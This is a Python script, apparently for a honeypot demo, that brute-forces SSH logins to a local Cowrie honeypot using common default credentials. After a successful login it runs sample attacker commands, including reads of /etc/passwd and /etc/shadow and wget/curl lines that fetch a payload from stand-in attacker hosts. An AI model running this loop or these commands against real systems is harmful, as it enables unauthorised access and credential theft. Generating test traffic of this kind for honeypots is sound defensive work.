#!/usr/bin/env python3
"""
Attack Simulation Script for Honeypot Demo
Simulates common brute-force attack patterns
"""

import subprocess
import time
import random

# Common credentials attackers try
USERNAMES = ["root", "admin", "ubuntu", "user", "test", "oracle", "postgres", "mysql", "guest", "administrator"]
PASSWORDS = ["root", "admin", "password", "123456", "12345678", "qwerty", "letmein", "password123", "welcome", "changeme"]

# Common commands attackers run after gaining access
COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "cat /etc/passwd",
    "ls -la",
    "ps aux",
    "wget http://malicious-site.com/malware.sh",
    "curl http://attacker.com/backdoor",
    "cat /etc/shadow",
    "netstat -an"
]

def attempt_login(username, password):
    """Attempt SSH login to honeypot"""
    print(f"[*] Trying: {username}:{password}")
    
    # Use sshpass to automate password entry (we'll install this)
    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 {username}@127.0.0.1 'exit' 2>&1"
    
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
        return "Permission denied" not in result.stderr.decode()
    except:
        return False

def run_commands_in_honeypot(username, password):
    """Run commands in the honeypot after successful login"""
    print(f"[+] Logged in as {username}, executing commands...")
    
    # Pick 3-5 random commands to run
    num_commands = random.randint(3, 5)
    commands_to_run = random.sample(COMMANDS, num_commands)
    
    for cmd in commands_to_run:
        print(f"    Executing: {cmd}")
        full_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 {username}@127.0.0.1 '{cmd}' 2>&1"
        subprocess.run(full_cmd, shell=True, capture_output=True, timeout=10)
        time.sleep(0.5)

def main():
    print("=" * 60)
    print("Honeypot Attack Simulator")
    print("Generating realistic attack traffic for demo...")
    print("=" * 60)
    
    num_attacks = int(input("How many attack attempts? (recommended: 30-50): "))
    
    successful_logins = 0
    
    for i in range(num_attacks):
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        
        print(f"\n[Attempt {i+1}/{num_attacks}]")
        
        success = attempt_login(username, password)
        
        if success:
            successful_logins += 1
            run_commands_in_honeypot(username, password)
        
        # Random delay between attempts (simulate different attackers)
        time.sleep(random.uniform(0.5, 2.0))
    
    print("\n" + "=" * 60)
    print(f"Simulation complete!")
    print(f"Total attempts: {num_attacks}")
    print(f"Successful logins: {successful_logins}")
    print("=" * 60)
    print("\nCheck Cowrie logs at: /home/cowrie/cowrie/var/log/cowrie/cowrie.json")

if __name__ == "__main__":
    main()
